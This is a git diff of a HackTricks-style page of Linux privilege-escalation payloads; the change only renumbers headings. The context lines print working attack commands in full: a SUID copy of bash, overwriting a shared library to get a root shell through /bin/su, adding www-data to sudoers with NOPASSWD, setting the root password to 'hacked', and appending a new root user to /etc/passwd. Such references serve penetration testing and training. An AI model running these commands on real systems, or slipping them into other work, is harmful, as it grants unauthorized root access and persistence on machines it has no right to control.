@@ -17,16 +17,14 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 </details>
 
 
-# Payloads to execute
-
-## Bash
+# Bash
 
 ```bash
 cp /bin/bash /tmp/b && chmod +s /tmp/b
 /bin/b -p #Maintains root privileges from suid, working in debian & buntu
 ```
 
-## C
+# C
 
 ```c
 //gcc payload.c -o payload
@@ -50,16 +48,16 @@ int main(){
 }
 ```
 
-## Overwriting a file to escalate privileges
+# Overwriting a file to escalate privileges
 
-### Common files
+## Common files
 
 * Add user with password to _/etc/passwd_
 * Change password inside _/etc/shadow_
 * Add user to sudoers in _/etc/sudoers_
 * Abuse docker through the docker socket, usually in _/run/docker.sock_ or _/var/run/docker.sock_
 
-### Overwriting a library
+## Overwriting a library
 
 Check a library used by some binary, in this case `/bin/su`:
 
@@ -112,29 +110,29 @@ void inject()
 
 Now, just calling **`/bin/su`** you will obtain a shell as root.
 
-## Scripts
+# Scripts
 
 Can you make root execute something?
 
-### **www-data to sudoers**
+## **www-data to sudoers**
 
 ```bash
 echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
 ```
 
-### **Change root password**
+## **Change root password**
 
 ```bash
 echo "root:hacked" | chpasswd
 ```
 
-### Add new root user to /etc/passwd
+## Add new root user to /etc/passwd
 
 ```bash
 echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
 ```
 
-### 
+## 
 
 
 
